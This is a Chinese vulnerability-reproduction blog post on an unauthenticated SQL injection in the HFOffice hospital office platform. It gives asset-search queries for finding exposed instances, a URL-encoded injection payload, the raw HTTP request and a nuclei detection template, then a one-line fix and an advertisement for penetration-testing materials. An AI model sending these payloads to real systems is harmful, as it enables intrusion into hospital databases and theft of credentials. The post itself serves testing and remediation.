# 原创
：  【漏洞复现】SQL注入漏洞

# 【漏洞复现】SQL注入漏洞

### 漏洞描述

红帆HFOffice医微云是广州红帆科技有限公司研发的专注医疗行政办公管理，与企业微信全方位结合，提供协同办公、知识库、专家系统、BI等应用，进一步帮助医院移动办公落地，成就面向医院管理的“智慧管理”。平台list接口处存在SQL注入漏洞，未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。

### 资产收集

fofa：”HFOffice”<br/> hunter：web.body=”HFOffice”<br/>  

### 漏洞复现

##### payload：

```

/api/switch-value/list?sorts=%5B%7B%22Field%22:%221-CONVERT(VARCHAR(32),%20HASHBYTES(%27MD5%27,%20%271234%27),%202);%22%7D%5D&amp;conditions=%5B%5D&amp;_ZQA_ID=4dc296c6c69905a7
```

payload是对某一列数据进行md5加密，如果回显发现转换失败的话，就说明存在SQL注入漏洞。

##### 流量包

```
GET /api/switch-value/list?sorts=%5B%7B%22Field%22:%221-CONVERT(VARCHAR(32),%20HASHBYTES(%27MD5%27,%20%271234%27),%202);%22%7D%5D&amp;conditions=%5B%5D&amp;_ZQA_ID=4dc296c6c69905a7 HTTP/1.1
Host: xxxxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 02 Mar 2021 07:52:43 GMT
If-None-Match: "aa32739fd71:0"
```

### nuclei验证

##### nuclei-poc

```
id: HFOffice

info:
name: HFOffice-SQL
author: xxxx
severity: info
description: description
reference:
- https://
tags: tags

requests:
- raw:
- |+
GET /api/switch-value/list?sorts=%5B%7B%22Field%22:%221-CONVERT(VARCHAR(32),%20HASHBYTES(%27MD5%27,%20%271234%27),%202);%22%7D%5D&amp;conditions=%5B%5D&amp;_ZQA_ID=4dc296c6c69905a7 HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
If-Modified-Since: Tue, 02 Mar 2021 07:52:43 GMT
If-None-Match: "aa32739fd71:0"


matchers-condition: and
matchers:
- type: binary
part: body
binary:
- 20e580bc20273831444339424442353244303444433230303336444244383331
- type: status
status:
- 400
```

##### nuclei验证

### 修复意见

此漏洞是由于部分用户站点下web.config的Debug的值设置为1，导致系统存在SQL注入漏洞，只需让相关系统站点下web.config的Debug值设为0即可。

---


## **免费领取安全学习资料包！**<img alt="" height="768" src="https://img-blog.csdnimg.cn/f1a227f491ad41dbb028e5935154d6f0.png" width="1024"/>

渗透工具

技术文档、书籍

<img alt="" height="516" src="https://img-blog.csdnimg.cn/388afb4a24324e58bb2185997f32906b.png" width="852"/> <img alt="" height="523" src="https://img-blog.csdnimg.cn/dee98040b99f41b28eec2edfe687c1ec.png" width="856"/>

面试题

帮助你在面试中脱颖而出

视频

基础到进阶

环境搭建、HTML，PHP，MySQL基础学习，信息收集，SQL注入,XSS，CSRF，暴力破解等等

<img alt="" height="481" src="https://img-blog.csdnimg.cn/27bdcfdd02684ef8b32790e3e0878530.png" width="694"/> <img alt="" height="77" src="https://img-blog.csdnimg.cn/caf53a2d1dd84c0da429876eb491c6ee.png" width="665"/>

应急响应笔记

学习路线
